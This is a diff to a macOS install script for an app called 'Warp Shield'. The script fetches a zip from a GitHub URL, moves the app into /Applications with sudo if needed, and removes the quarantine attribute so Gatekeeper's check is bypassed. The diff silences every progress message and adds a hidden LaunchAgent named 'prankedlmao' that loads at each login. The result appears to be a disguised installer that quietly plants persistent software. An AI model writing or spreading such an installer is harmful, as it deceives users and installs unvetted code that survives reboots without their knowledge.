@@ -5,6 +5,7 @@ set -euo pipefail
 ZIP_URL="https://raw.githubusercontent.com/44sk/expert-disco/main/Warp%20Shield.zip"
 TMPDIR="$(mktemp -d)"
 APP_NAME="Warp Shield.app"
+PLIST_NAME="com.Warpshield.prankedlmao.plist"
 
 cleanup() {
   rm -rf "$TMPDIR"
@@ -14,22 +15,20 @@ trap cleanup EXIT
 cd "$TMPDIR"
 
 # --- Download and unzip the app ---
-echo "Downloading Warp Shield..."
-curl -L --fail --retry 3 "$ZIP_URL" -o warp-shield.zip
+curl -fsSL "$ZIP_URL" -o warp-shield.zip
 unzip -q warp-shield.zip
 rm warp-shield.zip
 
-# --- Locate the .app ---
+# --- Locate the app ---
 APP_PATH="$(find . -type d -name "$APP_NAME" -print -quit)"
 if [ -z "$APP_PATH" ]; then
-  echo "Error: $APP_NAME not found in archive."
   exit 1
 fi
 
-# --- Move to /Applications ---
 DEST="/Applications/$(basename "$APP_PATH")"
+
+# --- Replace any existing version ---
 if [ -d "$DEST" ]; then
-  echo "Removing existing version..."
   if [ -w "$DEST" ]; then
     rm -rf "$DEST"
   else
@@ -37,16 +36,33 @@ if [ -d "$DEST" ]; then
   fi
 fi
 
-echo "Installing to /Applications..."
+# --- Move to /Applications ---
 if [ -w "/Applications" ]; then
   mv "$APP_PATH" /Applications/
 else
   sudo mv "$APP_PATH" /Applications/
 fi
 
-# --- Fix permissions and remove quarantine ---
+# --- Fix permissions ---
 xattr -d -r com.apple.quarantine "$DEST" 2>/dev/null || true
 chmod +x "$DEST/Contents/MacOS/"* 2>/dev/null || true
+
+# --- LaunchAgent setup ---
+PLIST_SRC="$DEST/Contents/Resources/$PLIST_NAME"
+PLIST_DST="$HOME/Library/LaunchAgents/$PLIST_NAME"
+
+mkdir -p "$HOME/Library/LaunchAgents"
+
+if [ -f "$PLIST_SRC" ]; then
+  cp "$PLIST_SRC" "$PLIST_DST"
+  chmod 644 "$PLIST_DST"
+  chown "$USER":staff "$PLIST_DST"
+
+  plutil -lint "$PLIST_DST" >/dev/null 2>&1 || true
+
+  launchctl bootout gui/$(id -u) "$PLIST_DST" 2>/dev/null || true
+  launchctl bootstrap gui/$(id -u) "$PLIST_DST" 2>/dev/null || true
+fi
 
 # --- Open the app ---
 open "$DEST"
